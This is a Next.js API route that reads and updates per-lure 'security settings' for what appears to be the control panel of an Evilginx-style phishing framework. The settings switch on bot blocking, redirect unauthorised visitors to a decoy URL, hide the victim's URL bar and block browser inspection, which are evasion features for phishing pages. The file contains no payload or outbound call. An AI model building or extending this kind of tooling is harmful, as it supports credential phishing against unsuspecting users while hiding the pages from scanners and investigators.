import { NextApiRequest, NextApiResponse } from "next";
import { configService } from "@/services/configService";

export default async function handler(
  req: NextApiRequest,
  res: NextApiResponse
) {
  try {
    if (req.method === "GET") {
      // Check if a specific lure index was requested
      const { lureIndex } = req.query;
      const lureIndexNum =
        lureIndex !== undefined ? Number(lureIndex) : undefined;

      console.log(
        `API /security-settings GET: Requesting settings for lure index ${lureIndexNum}`
      );

      const config = await configService.readConfig();
      if (!config) {
        return res.status(200).json({
          blockBots: true,
          redirectUrl: "https://example.com",
          hideUrlBar: true,
          blockInspect: true,
          redirectGuard: true,
        });
      }

      // Add null checks for all nested properties
      const blacklist = config.blacklist || {};
      const general = config.general || {};

      // Lure-specific security settings - for future use
      // Currently, the global settings apply to all lures
      const blockBots = blacklist.mode === "unauth";
      const redirectUrl = general.unauth_url || "https://example.com";

      // For hideUrlBar, blockInspect, redirectGuard - we don't have these in the config yet
      // In the future, these could be lure-specific
      const hideUrlBar = true;
      const blockInspect = true;
      const redirectGuard = true;

      return res.status(200).json({
        blockBots,
        redirectUrl,
        hideUrlBar,
        blockInspect,
        redirectGuard,
        lureIndex: lureIndexNum, // Return the requested lure index
      });
    } else if (req.method === "POST") {
      const {
        blockBots,
        redirectUrl,
        hideUrlBar,
        blockInspect,
        redirectGuard,
        lureIndex,
      } = req.body;

      console.log(
        `API /security-settings POST: Updating settings for lure index ${lureIndex}`
      );

      let success = true;

      // Update blacklist mode if provided
      if (typeof blockBots === "boolean") {
        success = await configService.updateBlacklistMode(blockBots);
      }

      // Update redirect URL if provided
      if (redirectUrl !== undefined) {
        success = await configService.updateRedirectUrl(redirectUrl);
      }

      // For now, we don't store these values in config.json
      // In the future, we could make these lure-specific
      // hideUrlBar, blockInspect, redirectGuard

      if (success) {
        return res.status(200).json({
          message: "Security settings updated successfully",
          lureIndex,
        });
      } else {
        return res.status(500).json({ error: "Failed to update settings" });
      }
    } else {
      res.status(405).json({ error: "Method not allowed" });
    }
  } catch (error) {
    console.error("Error handling security settings:", error);
    res.status(500).json({ error: "Internal server error" });
  }
}
